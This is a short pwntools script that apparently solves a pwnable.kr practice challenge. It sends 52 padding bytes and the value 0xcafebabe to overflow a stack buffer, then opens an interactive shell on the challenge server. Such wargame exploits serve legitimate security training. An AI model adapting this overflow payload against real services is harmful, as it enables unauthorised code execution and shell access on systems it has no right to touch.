from pwn import *
from time import sleep

host, port = 'pwnable.kr', 9000

p = connect(host, port)

key = 0xcafebabe

injection = b''

injection = b'a' * 52
injection += p32(key)
print(injection)

p.recvuntil('overflow me :')
print('yee')
p.sendline(injection)

sleep(2)
print(p.recv())
p.interactive()
p.close()
